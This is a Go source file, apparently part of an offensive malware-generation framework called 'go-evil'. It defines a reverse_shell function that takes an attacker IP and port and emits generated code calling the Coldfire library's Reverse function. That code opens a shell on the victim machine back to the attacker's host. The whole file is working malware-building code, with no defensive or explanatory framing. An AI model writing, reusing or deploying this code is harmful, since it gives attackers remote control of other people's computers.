package network

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Creates a reverse shell
// Input, evil array, format ${"attacker ip", "attacker port"}$
func reverse_shell(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "reverse_shell"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "network.reverse_shell()")
	}

	ip := arr.Get(0)
	port := arr.Get(1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, repr_2 int){", function_call),
		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"coldfire.Reverse(param_1, repr_2)",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	i_port := tools.String_to_int(port)
	if i_port == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", port), "network.reverse_shell()")
	}

	parameter_1 := data_object.Generate_int_array_parameter(ip)

	return []string{fmt.Sprintf("%s(%s, %d)", function_call, parameter_1, i_port)}, structure.Send(data_object)
}
